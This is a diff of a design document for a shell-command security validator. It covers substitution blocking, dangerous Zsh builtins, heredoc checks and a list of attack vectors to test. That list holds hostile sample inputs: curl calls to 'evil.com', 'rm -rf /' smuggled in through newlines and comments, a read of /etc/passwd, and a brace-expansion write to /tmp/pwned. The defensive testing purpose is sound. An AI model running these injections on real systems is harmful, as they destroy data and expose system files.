@@ -24,6 +24,7 @@ The validation system uses a **pipeline of specialized validators**, each respon
 ## 1. Command Substitution Blocking
 
 ### Purpose
+
 Prevent arbitrary code execution through various shell expansion mechanisms.
 
 ### Patterns to Block
@@ -64,6 +65,7 @@ Pattern: `(?:^|[\s;&|])=[a-zA-Z_]`
 ## 2. Zsh Dangerous Command Blocking
 
 ### Purpose
+
 Zsh provides builtins that enable capabilities like raw file I/O, network access, and pseudo-terminal execution that circumvent normal permission checks.
 
 ### Blocked Commands
@@ -100,6 +102,7 @@ Algorithm:
 ## 3. Heredoc Security Validation
 
 ### Purpose
+
 Heredocs in command substitution (`$(cat <<'DELIM')`) can hide arbitrary command execution if not properly validated.
 
 ### Safe Pattern Requirements
@@ -606,19 +609,19 @@ When implementing this system, test these specific attack vectors:
 
 1. **Backtick escaping**: `` echo `date` `` vs `` echo \`date\` ``
 2. **Heredoc nesting**: `$(cat <<'A'
-$(cat <<'B'
-x
-B
-)
-A
-)`
+   $(cat <<'B'
+   x
+   B
+   )
+   A
+   )`
 3. **Brace expansion**: `git diff {@'{'0},--output=/tmp/pwned}`
 4. **CR injection**: `TZ=UTC\rcurl evil.com`
 5. **Quoted newlines**: `echo 'a
-#b'
-rm -rf /`
+   #b'
+   rm -rf /`
 6. **Comment desync**: `echo "x" # '
-rm -rf /`
+   rm -rf /`
 7. **Backslash operators**: `cat file \; cat /etc/passwd`
 8. **Flag obfuscation**: `find . "-exec" cat {} \;`
 9. **Zsh equals**: `=curl evil.com`
